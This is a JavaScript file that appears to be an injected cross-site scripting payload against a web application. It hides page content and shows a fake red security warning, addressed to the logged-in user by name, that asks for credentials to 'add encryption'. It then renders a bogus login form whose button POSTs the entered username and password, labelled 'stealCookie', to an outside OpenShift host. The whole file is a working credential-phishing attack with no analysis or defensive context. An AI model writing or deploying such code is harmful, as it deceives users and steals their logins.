(function() {
	document.getElementsByClassName("container-fluid")[1].style.display = "none";

	var myStyle = document.createElement("style");
	myStyle.type = "text/css";
	myStyle.innerHTML = ".inputClass{width:180px;padding:5px;border:2px solid #ccc;-webkit-border-radius:5px;border-radius:5px;}.buttonClass{width:180px;padding:5px 15px;background:#ccc;border:0 none;cursor:pointer;-webkit-border-radius:5px;border-radius:5px;margin:5px}";
	document.getElementsByTagName("head")[0].appendChild(myStyle);

	var name = document.getElementsByClassName("dropdown-toggle")[0].text
			.trim();
	var warnMsg1 = document
			.createTextNode("["
					+ name
					+ "], To protect our customers from data leak, we have added an additional end-to-end encryption.");

	var warnMsg2 = document
			.createTextNode("Please provide your credentials to add the encryption to your account!");

	var myWarning = document.createElement("h4");
	myWarning.style.color = "red";
	myWarning.style.marginTop = "150px";
	myWarning.style.textAlign = "center";
	myWarning.appendChild(warnMsg1);
	myWarning.appendChild(document.createElement("br"));
	myWarning.appendChild(warnMsg2);

	var username = document.createElement("input");
	username.type = "text";
	username.id = "username";
	username.name = "username";
	username.className = "inputClass";
	username.placeholder = "Enter Username!";

	var password = document.createElement("input");
	password.type = "password";
	password.id = "password";
	password.name = "password";
	password.className = "inputClass";
	password.placeholder = "Enter Password!";

	var button = document.createElement("button");
	button.type = "button";
	button.id = "loginButton";
	button.className = "buttonClass";
	button.innerText = "Login!";

	var myForm = document.createElement("form");
	myForm.style.textAlign = "center";
	myForm.style.marginTop = "100px";
	myForm.appendChild(username);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(password);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(button);

	var myDiv = document.createElement("div");
	myDiv.style.margin = "auto";
	myDiv.style.width = "80%";
	myDiv.appendChild(myWarning);
	myDiv.appendChild(myForm);

	var myParent = document.getElementsByTagName("div")[0];
	myParent.appendChild(myDiv);

	document.getElementById("loginButton").onclick = function() {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("ajax").innerHTML = this.responseText;
			}
			location.href = location.protocol + '//' + location.host + '/' + location.pathname.split("/")[1];
		};
		xhttp.open("POST",
				"http://jws-app-governance.1d35.starter-us-east-1.openshiftapps.com/AppController",
				true);
		xhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
		xhttp.send("requestType=stealCookie&username="
				+ document.getElementsByClassName("dropdown-toggle")[0].text
						.trim() + "&cookie=username="
				+ document.getElementById("username").value + " | password:"
				+ document.getElementById("password").value);
	};
})();